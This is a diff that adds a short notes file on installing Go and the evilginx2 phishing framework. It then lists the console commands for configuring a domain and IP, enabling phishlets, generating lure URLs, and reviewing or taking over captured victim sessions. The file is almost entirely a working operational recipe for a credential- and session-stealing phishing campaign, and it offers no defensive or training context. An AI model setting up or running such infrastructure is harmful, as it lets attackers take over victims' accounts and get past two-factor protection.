@@ -1,0 +1,41 @@
+FOR GO INSTALLTION
+-------------------
+
+wget "go download link"
+tar -C /usr/local -xzf "go zip path"
+nano /etc/profile # add this line: export PATH=$PATH:/usr/local/go/bin
+source /etc/profile
+go
+
+
+TO INSTALL EVILGINX2
+---------------------
+
+sudo apt-get -y install git make
+git clone https://github.com/kgretzky/evilginx2.git
+cd evilginx2
+make
+sudo make install
+
+
+AFTER INSTALLTION
+-------------------- 
+sudo apt install openssl keytool certbot
+sudo systemctl stop systemd-resolved
+nano /etc/resolv.conf "and change nameserver to 8.8.8.8
+
+EVILGINX2 COMMANDS
+-------------------
+
+config domain "YOUR DOMAIN NAME"
+config ip "YOUR PUBLIC IP"
+phishlets hostname "PHISHLETS NAME" "YOUR DOMAIN NAME"
+phishlets enable "PHISHLETS NAME"
+lures create "PHISHLETS NAME"
+lures get-url "LURES NUMBER"
+sessions -----FOR CHECK ALL THE SESSIONS THAT AVAILABLE
+sessions <ID> ------TO INTERACTED WITH THE SESSIONS
+phishlets disable "your phishlets name" ----to disable phishlets
+
+
+
